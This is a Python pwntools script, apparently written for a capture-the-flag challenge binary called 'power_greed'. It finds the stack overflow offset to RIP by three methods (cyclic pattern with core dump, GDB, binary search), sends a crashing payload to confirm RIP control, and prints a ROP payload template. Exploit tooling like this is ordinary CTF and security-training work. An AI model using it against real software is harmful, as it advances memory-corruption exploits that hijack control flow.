#!/usr/bin/env python3
from pwn import *
import time
import os
import tempfile

# Script to automatically detect the exact offset to RIP
context.arch = 'amd64'
context.log_level = 'info'

def enable_core_dumps():
    """Enable core dumps for crash analysis"""
    try:
        # Set unlimited core dump size
        os.system('ulimit -c unlimited')
        # Set core dump pattern
        os.system('echo core > /proc/sys/kernel/core_pattern 2>/dev/null || true')
        print("[+] Core dumps enabled")
        return True
    except:
        print("[!] Could not enable core dumps (may need sudo)")
        return False

def detect_offset_with_cyclic():
    """Method 1: Use cyclic pattern and core dump analysis"""
    print("\n=== Method 1: Cyclic Pattern + Core Dump Analysis ===")
    
    enable_core_dumps()
    
    # Generate a large cyclic pattern
    pattern_size = 200  # Larger than our expected offset
    pattern = cyclic(pattern_size)
    
    print(f"[+] Generated {pattern_size}-byte cyclic pattern")
    print(f"[+] Pattern preview: {pattern[:32]}...")
    
    # Create a temporary directory for core dump
    with tempfile.TemporaryDirectory() as tmpdir:
        # Change to temp directory to catch core dump
        original_dir = os.getcwd()
        os.chdir(tmpdir)
        
        try:
            p = process([original_dir + '/power_greed'])
            
            # Navigate to vulnerable function
            p.sendlineafter(b'> ', b'1')
            p.sendlineafter(b'> ', b'1')
            p.sendlineafter(b': ', b'y')
            
            # Send cyclic pattern
            p.sendlineafter(b'buffer: ', pattern)
            
            # Wait for crash
            p.wait()
            
            # Look for core dump
            core_files = [f for f in os.listdir('.') if f.startswith('core')]
            
            if core_files:
                core_file = core_files[0]
                print(f"[+] Found core dump: {core_file}")
                
                try:
                    # Analyze core dump
                    core = Coredump(core_file)
                    
                    # Get the fault address (what was in RIP when it crashed)
                    fault_addr = core.fault_addr
                    print(f"[+] Fault address: {hex(fault_addr)}")
                    
                    # Find offset in cyclic pattern
                    try:
                        offset = cyclic_find(fault_addr)
                        if offset != -1:
                            print(f"[+] ✅ OFFSET FOUND: {offset} bytes (0x{offset:x})")
                            return offset
                        else:
                            print(f"[+] Fault address not found in pattern, trying packed format...")
                            # Try finding the packed value
                            offset = cyclic_find(p64(fault_addr))
                            if offset != -1:
                                print(f"[+] ✅ OFFSET FOUND: {offset} bytes (0x{offset:x})")
                                return offset
                    except:
                        print("[!] Could not find offset in cyclic pattern")
                        
                except Exception as e:
                    print(f"[!] Could not analyze core dump: {e}")
            else:
                print("[!] No core dump found")
                
        except Exception as e:
            print(f"[!] Error during crash test: {e}")
        finally:
            os.chdir(original_dir)
    
    return None

def detect_offset_with_gdb():
    """Method 2: Use GDB to detect crash location"""
    print("\n=== Method 2: GDB Analysis ===")
    
    pattern_size = 200
    pattern = cyclic(pattern_size)
    
    # Create GDB script
    gdb_script = """
set pagination off
set confirm off
run
c
c
c
{}
info registers
quit
""".format(pattern.decode('latin-1'))
    
    try:
        # Write GDB commands to temp file
        with tempfile.NamedTemporaryFile(mode='w', suffix='.gdb', delete=False) as f:
            f.write(gdb_script)
            gdb_file = f.name
        
        # Run GDB
        cmd = f"echo '1\n1\ny\n{pattern.decode('latin-1')}' | gdb -batch -x {gdb_file} ./power_greed 2>&1"
        result = os.popen(cmd).read()
        
        print("[+] GDB output analysis:")
        
        # Look for RIP register value in output
        lines = result.split('\n')
        for line in lines:
            if 'rip' in line.lower():
                print(f"    {line.strip()}")
                # Try to extract RIP value and find in pattern
                import re
                rip_match = re.search(r'rip\s+0x([0-9a-f]+)', line, re.IGNORECASE)
                if rip_match:
                    rip_val = int(rip_match.group(1), 16)
                    print(f"[+] RIP value: {hex(rip_val)}")
                    
                    try:
                        offset = cyclic_find(rip_val)
                        if offset != -1:
                            print(f"[+] ✅ OFFSET FOUND: {offset} bytes (0x{offset:x})")
                            return offset
                    except:
                        pass
        
        # Clean up
        os.unlink(gdb_file)
        
    except Exception as e:
        print(f"[!] GDB analysis failed: {e}")
    
    return None

def detect_offset_manual_search():
    """Method 3: Binary search for exact crash point"""
    print("\n=== Method 3: Binary Search for Crash Point ===")
    
    # Binary search to find exact offset
    min_offset = 0
    max_offset = 200
    
    while min_offset < max_offset:
        test_offset = (min_offset + max_offset) // 2
        print(f"[+] Testing offset {test_offset}...")
        
        # Create test payload
        payload = b'A' * test_offset + b'BBBBBBBB'  # 8 B's to overwrite RIP
        
        try:
            p = process('./power_greed')
            
            # Navigate to function
            p.sendlineafter(b'> ', b'1')
            p.sendlineafter(b'> ', b'1')
            p.sendlineafter(b': ', b'y')
            
            # Send test payload
            p.sendlineafter(b'buffer: ', payload)
            
            # Check exit code
            p.wait()
            exit_code = p.poll()
            
            if exit_code == -11:  # SIGSEGV
                print(f"    Crash at offset {test_offset}")
                if test_offset == min_offset:
                    print(f"[+] ✅ OFFSET FOUND: {test_offset} bytes (0x{test_offset:x})")
                    return test_offset
                max_offset = test_offset
            else:
                print(f"    No crash at offset {test_offset}")
                min_offset = test_offset + 1
                
        except Exception as e:
            print(f"    Error testing offset {test_offset}: {e}")
            min_offset = test_offset + 1
    
    return None

def verify_offset(offset):
    """Verify the detected offset works correctly"""
    print(f"\n=== Verifying Offset {offset} ===")
    
    # Test with a recognizable pattern
    test_rip = 0x4141414141414141  # AAAAAAAA
    
    payload = b'X' * offset + p64(test_rip)
    
    try:
        p = process('./power_greed')
        
        p.sendlineafter(b'> ', b'1')
        p.sendlineafter(b'> ', b'1')
        p.sendlineafter(b': ', b'y')
        
        p.sendlineafter(b'buffer: ', payload)
        
        p.wait()
        
        # Check if we can analyze the crash
        print(f"[+] Sent {len(payload)} bytes with RIP = {hex(test_rip)}")
        print(f"[+] Process crashed as expected")
        return True
        
    except Exception as e:
        print(f"[!] Verification failed: {e}")
        return False

def main():
    print("=== Automatic Offset Detection for power_greed ===")
    print("[+] This script will find the exact offset to control RIP")
    
    detected_offset = None
    
    # Try multiple methods
    methods = [
        detect_offset_with_cyclic,
        detect_offset_with_gdb,
        detect_offset_manual_search
    ]
    
    for i, method in enumerate(methods, 1):
        print(f"\n[+] Trying method {i}...")
        try:
            offset = method()
            if offset is not None:
                detected_offset = offset
                print(f"[+] Method {i} succeeded!")
                break
        except Exception as e:
            print(f"[!] Method {i} failed: {e}")
            continue
    
    if detected_offset is not None:
        print(f"\n🎯 RESULT: Offset to RIP is {detected_offset} bytes (0x{detected_offset:x})")
        
        # Verify the offset
        if verify_offset(detected_offset):
            print(f"[+] ✅ Offset verified successfully!")
            
            # Show how to use it
            print(f"\n💡 Usage in exploit:")
            print(f"    padding = b'A' * {detected_offset}  # or b'A' * 0x{detected_offset:x}")
            print(f"    payload = padding + p64(ROP_GADGET_ADDRESS)")
        else:
            print(f"[!] Offset verification failed")
    else:
        print(f"\n❌ Could not detect offset automatically")
        print(f"[!] Try running with sudo for core dump access")
        print(f"[!] Or manually analyze with GDB")

if __name__ == '__main__':
    main()

